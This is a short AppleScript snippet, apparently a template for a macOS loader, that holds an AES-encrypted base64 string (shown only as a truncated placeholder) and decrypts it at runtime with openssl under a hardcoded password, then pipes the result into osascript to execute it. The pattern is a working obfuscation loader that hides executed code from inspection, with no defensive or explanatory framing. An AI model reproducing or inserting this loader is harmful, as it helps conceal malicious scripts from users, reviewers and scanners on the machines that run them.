-- Encrypted AES payload (base64 encoded)
set aes_b64 to "U2FsdGVkX1+..." -- encrypted base64 string
-- Decrypt at runtime using OpenSSL and execute
do shell script "echo " & quoted form of aes_b64 & " | base64 -D | openssl enc -aes-256-cbc -d -pass pass:secret | osascript"
